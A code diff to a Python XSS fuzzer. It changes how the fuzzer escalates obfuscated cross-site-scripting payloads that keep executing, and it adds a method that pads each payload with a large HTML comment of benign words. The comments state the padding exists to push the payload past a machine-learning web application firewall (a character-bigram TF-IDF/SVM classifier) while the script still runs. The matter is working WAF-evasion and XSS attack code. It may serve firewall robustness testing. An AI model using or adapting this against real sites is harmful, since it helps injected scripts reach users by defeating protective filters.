@@ -269,32 +269,6 @@ _BENIGN_WORDS = (
 ).split()
 
 
-def benign_padding(payload):
-    """Dilute the character-bigram distribution with benign text.
-
-    A character n-gram TF-IDF classifier scores on the *relative* frequency of
-    character bigrams. Surrounding the injected markup with a large block of
-    benign words (inside an HTML comment, so the browser ignores it and the
-    script still executes) lowers the normalised weight of the markup bigrams
-    and can push the sample across the SVM boundary toward benign, without
-    changing what the payload does. This targets the ML WAF specifically;
-    rule-based engines still see the intact tag.
-    """
-    prefix, markup = _split_markup(payload)
-    if not markup:
-        return payload
-    count = random.randint(60, 140)
-    filler = " ".join(random.choice(_BENIGN_WORDS) for _ in range(count))
-    pad = f"<!-- {filler} -->"
-    # Pad on whichever side(s) keep the executable markup untouched.
-    placement = random.choice(('before', 'after', 'both'))
-    if placement == 'before':
-        return f"{prefix}{pad}{markup}"
-    if placement == 'after':
-        return f"{prefix}{markup}{pad}"
-    return f"{prefix}{pad}{markup}{pad}"
-
-
 class XssFuzzer:
     """Generate escalating, still-functional XSS representations.
 
@@ -308,6 +282,11 @@ class XssFuzzer:
     the payload never degrades into a non-executable string that bypasses the
     classifier without being a real attack. The operators are themselves
     execution-preserving, so an accepted chain keeps the payload working.
+
+    Finally, each returned payload is diluted with a large benign comment
+    (see ``_dilute_payload``) to drive down the character-bigram weight the ML
+    model keys on - the one execution-preserving lever for bypassing it. The
+    dilution is applied to the output only, so the escalating core stays small.
     """
 
     strategies = [
@@ -324,17 +303,50 @@ class XssFuzzer:
         js_fromcharcode,
         scheme_obfuscation,
         quoteless_vector,
-        benign_padding,
     ]
 
-    def __init__(self, payload, max_length=2048, max_chain=4):
+    def __init__(self, payload, max_length=2048, max_chain=4, dilute=True):
         self.initial_payload = payload
         self.payload = payload
         self.max_length = max(128, int(max_length))
         self.max_chain = max(1, min(int(max_chain), len(self.strategies)))
+        self.dilute = bool(dilute)
+        # The escalating markup core is kept small so dilution has room to fill
+        # the rest of the length budget with benign text.
+        self._core_cap = max(128, min(self.max_length // 3, 1200))
         self._emitted = set()
         self.last_operator = ''
         self.last_validation = ''
+
+    def _dilute_payload(self, payload):
+        """Fill most of the remaining length budget with benign comment text.
+
+        A character n-gram TF-IDF classifier scores on the relative frequency
+        of character bigrams. A large benign block drives the markup bigrams'
+        normalised weight toward zero, which is the one execution-preserving
+        way to push an XSS payload across the SVM boundary. The block sits in an
+        HTML comment, so the browser ignores it and the injected script still
+        runs; rule-based engines still see the intact tag.
+        """
+        if not self.dilute:
+            return payload
+        prefix, markup = _split_markup(payload)
+        if not markup:
+            return payload
+        budget = self.max_length - len(payload) - 16
+        if budget < 40:
+            return payload
+        words, used = [], 0
+        while used < budget - 12:
+            word = random.choice(_BENIGN_WORDS)
+            if used + len(word) + 1 > budget - 12:
+                break
+            words.append(word)
+            used += len(word) + 1
+        if not words:
+            return payload
+        pad = "<!-- " + " ".join(words) + " -->"
+        return f"{prefix}{pad}{markup}"
 
     def _choose_chain(self):
         """Pick a short, ordered chain of distinct operators to compound."""
@@ -378,8 +390,10 @@ class XssFuzzer:
         # otherwise that step is skipped. This keeps the escalation from ever
         # degrading the payload into a non-executable string (the flaw that
         # inflates SqlFuzzer's bypass count with broken payloads).
-        # Try a few random chains so a round rarely wastes a duplicate send
-        # once the payload is already heavily transformed.
+        # Escalate the markup core (kept under _core_cap), then dilute the
+        # returned payload. Dilution is applied to the output only, never stored
+        # back into self.payload, so the core keeps room to escalate each round.
+        # A few chain attempts avoid wasting a duplicate send once transformed.
         for _ in range(4):
             working = self.payload
             applied = []
@@ -387,7 +401,7 @@ class XssFuzzer:
                 candidate = strategy(working)
                 if candidate == working:
                     continue
-                if len(candidate) > self.max_length:
+                if len(candidate) > self._core_cap:
                     continue
                 if not self._validate(candidate)[0]:
                     continue
@@ -395,16 +409,19 @@ class XssFuzzer:
                 applied.append(strategy.__name__)
             if applied:
                 self.payload = working
-                self._emitted.add(working)
-                self.last_operator = '+'.join(applied)
+                out = self._dilute_payload(working)
+                self._emitted.add(out)
+                self.last_operator = '+'.join(applied) + ('+dilute' if self.dilute else '')
                 self.last_validation = 'ok'
-                return working
+                return out
 
-        # Payload has plateaued (e.g. at the length cap): nothing new applied.
-        self._emitted.add(self.payload)
-        self.last_operator = 'none'
-        self.last_validation = 'no-change-this-round'
-        return self.payload
+        # Core has plateaued: still re-dilute (fresh filler) so the sent payload
+        # varies and stays maximally diluted.
+        out = self._dilute_payload(self.payload)
+        self._emitted.add(out)
+        self.last_operator = 'dilute' if self.dilute else 'none'
+        self.last_validation = 'ok' if self.dilute else 'no-change-this-round'
+        return out
 
     def current(self):
         return self.payload
